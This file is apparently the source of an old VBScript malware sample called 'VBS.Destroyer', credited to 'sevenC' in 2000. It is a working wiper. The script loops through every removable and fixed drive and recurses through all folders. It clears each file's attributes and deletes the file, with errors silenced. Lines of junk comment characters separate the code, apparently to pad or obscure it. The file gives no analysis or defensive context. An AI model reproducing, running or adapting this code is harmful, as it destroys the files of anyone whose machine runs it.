'VBS.Destroyer (c)2000 by sevenC
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 On Error Resume Next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 Set FSO = CreateObject("Scripting.FileSystemObject")
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 For Each DType In FSO.Drives
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
  If DType.DriveType = 2 Or DType.DriveType = 3 Then
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
	Searching(DType.Path&"\")
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
  End If
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 Next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
Sub Searching(fspec)
 On Error Resume Next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 Set FS4 = FSO.GetFolder(fspec)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 For Each F2F In FS4.Files
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
	FSO.GetFile(F2F.Path).Attributes = 32
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
	FSO.DeleteFile F2F.Path
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 Next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 For Each F4D In FS4.SubFolders
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
	Searching(F4D.Path)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
 Next
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
End Sub
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)
'�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)�3������W{��T�y�5)